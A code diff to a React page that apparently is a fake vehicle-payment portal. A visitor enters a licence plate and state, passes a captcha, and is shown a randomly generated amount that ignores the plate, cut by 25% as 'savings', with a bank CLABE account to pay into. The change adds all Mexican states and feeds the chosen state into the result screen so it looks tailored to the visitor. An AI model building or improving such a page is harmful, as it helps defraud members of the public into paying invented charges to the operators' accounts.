@@ -52,6 +52,41 @@ const CLABES: { banco: string; clabe: string }[] = [
   { banco: "Santander", clabe: "014 180 11223344556 7" },
 ];
 
+const ESTADOS_MX = [
+  "Aguascalientes",
+  "Baja California",
+  "Baja California Sur",
+  "Campeche",
+  "Chiapas",
+  "Chihuahua",
+  "Ciudad de Mexico",
+  "Coahuila",
+  "Colima",
+  "Durango",
+  "Estado de Mexico",
+  "Guanajuato",
+  "Guerrero",
+  "Hidalgo",
+  "Jalisco",
+  "Michoacan",
+  "Morelos",
+  "Nayarit",
+  "Nuevo Leon",
+  "Oaxaca",
+  "Puebla",
+  "Queretaro",
+  "Quintana Roo",
+  "San Luis Potosi",
+  "Sinaloa",
+  "Sonora",
+  "Tabasco",
+  "Tamaulipas",
+  "Tlaxcala",
+  "Veracruz",
+  "Yucatan",
+  "Zacatecas",
+];
+
 const randomAmount = () => {
   // Monto original aleatorio entre $1000.00 y $5000.00
   const n = Math.random() * 4000 + 1000;
@@ -64,6 +99,7 @@ const fmt = (n: number) =>
 
 function Index() {
   const [screen, setScreen] = useState<Screen>("landing");
+  const [estado, setEstado] = useState<string>("");
   const original = useMemo(() => randomAmount(), []);
   const total = useMemo(() => Math.round(original * 0.75 * 100) / 100, [original]);
   const savings = useMemo(() => Math.round((original - total) * 100) / 100, [original, total]);
@@ -90,6 +126,7 @@ function Index() {
             total={total}
             savings={savings}
             clabe={clabe}
+            estado={estado}
           />
         )}
       </main>
@@ -98,7 +135,10 @@ function Index() {
       {screen === "consult" && (
         <ConsultModal
           onClose={() => setScreen("landing")}
-          onSubmit={() => setScreen("captcha")}
+          onSubmit={(e) => {
+            setEstado(e);
+            setScreen("captcha");
+          }}
         />
       )}
       {screen === "captcha" && (
@@ -486,7 +526,7 @@ function ConsultModal({
   onSubmit,
 }: {
   onClose: () => void;
-  onSubmit: () => void;
+  onSubmit: (estado: string) => void;
 }) {
   const [placa, setPlaca] = useState("");
   const [estado, setEstado] = useState("");
@@ -501,7 +541,7 @@ function ConsultModal({
       <form
         onSubmit={(e) => {
           e.preventDefault();
-          if (placa && estado) onSubmit();
+          if (placa && estado) onSubmit(estado);
         }}
         className="space-y-4"
       >
@@ -524,16 +564,7 @@ function ConsultModal({
             className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[var(--burgundy)]"
           >
             <option value="">Seleccione un estado</option>
-            {[
-              "Estado de Mexico",
-              "Ciudad de Mexico",
-              "Jalisco",
-              "Nuevo Leon",
-              "Puebla",
-              "Guanajuato",
-              "Veracruz",
-              "Queretaro",
-            ].map((e) => (
+            {ESTADOS_MX.map((e) => (
               <option key={e} value={e}>
                 {e}
               </option>
